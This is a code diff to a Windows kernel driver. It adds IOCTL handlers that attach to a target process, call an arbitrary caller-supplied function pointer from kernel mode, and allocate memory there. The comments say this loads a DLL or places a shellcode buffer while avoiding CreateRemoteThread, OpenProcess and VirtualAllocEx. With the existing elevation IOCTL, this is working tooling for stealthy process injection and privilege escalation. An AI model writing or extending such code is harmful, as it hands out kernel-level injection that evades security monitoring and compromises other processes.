@@ -213,6 +213,74 @@ static VOID NrBuildDeviceName(VOID)
     RtlInitUnicodeString(&g_DevName, g_DevNameChars);
 }
 
+/* The execution primitive. Attach the target's address space and call a
+ * function there, from kernel context. This is how the client's DLL is loaded
+ * without CreateRemoteThread -- the app allocates and writes the path (both
+ * rights the client grants), and this calls LoadLibraryW on it.
+ *
+ * Kernel-mode callbacks must be guarded: a bad pointer in the target must not
+ * bugcheck the whole machine, so the call is wrapped and returns a status on
+ * fault rather than taking the box down. */
+typedef ULONG64 (*NR_TARGET_FN)(ULONG64, ULONG64, ULONG64, ULONG64);
+
+static NTSTATUS NrCall(NR_CALL_REQ* req)
+{
+    KAPC_STATE apc;
+    ULONG64    ret = 0;
+    NR_TARGET_FN fn;
+
+    if (!g_State.Target)
+        return STATUS_INVALID_DEVICE_STATE;
+    if (KeGetCurrentIrql() != PASSIVE_LEVEL)
+        return STATUS_INVALID_DEVICE_STATE;   /* KeStackAttachProcess needs PASSIVE */
+    if (!req->Function)
+        return STATUS_INVALID_PARAMETER;
+
+    fn = (NR_TARGET_FN)req->Function;
+
+    KeStackAttachProcess(g_State.Target, &apc);
+    __try {
+        ret = fn(req->Arg1, req->Arg2, req->Arg3, req->Arg4);
+    } __except (EXCEPTION_EXECUTE_HANDLER) {
+        KeUnstackDetachProcess(&apc);
+        return STATUS_ACCESS_VIOLATION;        /* the address was not callable */
+    }
+    KeUnstackDetachProcess(&apc);
+
+    req->Return = ret;
+    return STATUS_SUCCESS;
+}
+
+/* Allocate in the target's address space from the kernel, so a DLL path (or a
+ * shellcode buffer) can be placed without OpenProcess + VirtualAllocEx. After
+ * attaching, NtCurrentProcess() refers to the target, which is what makes the
+ * allocation land there. */
+static NTSTATUS NrAlloc(NR_ALLOC_REQ* req)
+{
+    KAPC_STATE apc;
+    PVOID      base = NULL;
+    SIZE_T     size = (SIZE_T)req->Size;
+    NTSTATUS   st;
+    ULONG      protect = req->Protect ? req->Protect : PAGE_READWRITE;
+
+    if (!g_State.Target)
+        return STATUS_INVALID_DEVICE_STATE;
+    if (KeGetCurrentIrql() != PASSIVE_LEVEL)
+        return STATUS_INVALID_DEVICE_STATE;
+    if (!size || size > (64ULL << 20))
+        return STATUS_INVALID_PARAMETER;       /* refuse an absurd length */
+
+    KeStackAttachProcess(g_State.Target, &apc);
+    st = ZwAllocateVirtualMemory(NtCurrentProcess(), &base, 0, &size,
+                                 MEM_COMMIT | MEM_RESERVE, protect);
+    KeUnstackDetachProcess(&apc);
+
+    if (!NT_SUCCESS(st))
+        return st;
+    req->Address = (ULONG64)base;
+    return STATUS_SUCCESS;
+}
+
 static NTSTATUS NrCreateClose(PDEVICE_OBJECT dev, PIRP irp)
 {
     UNREFERENCED_PARAMETER(dev);
@@ -277,6 +345,22 @@ static NTSTATUS NrDeviceControl(PDEVICE_OBJECT dev, PIRP irp)
 
     case IOCTL_NR_ELEVATE:
         st = NrElevate();
+        break;
+
+    case IOCTL_NR_CALL:
+        if (inLen >= sizeof(NR_CALL_REQ) && outLen >= sizeof(NR_CALL_REQ)) {
+            st = NrCall((NR_CALL_REQ*)buf);
+            if (NT_SUCCESS(st))
+                info = sizeof(NR_CALL_REQ);
+        }
+        break;
+
+    case IOCTL_NR_ALLOC:
+        if (inLen >= sizeof(NR_ALLOC_REQ) && outLen >= sizeof(NR_ALLOC_REQ)) {
+            st = NrAlloc((NR_ALLOC_REQ*)buf);
+            if (NT_SUCCESS(st))
+                info = sizeof(NR_ALLOC_REQ);
+        }
         break;
 
     case IOCTL_NR_QUERY:
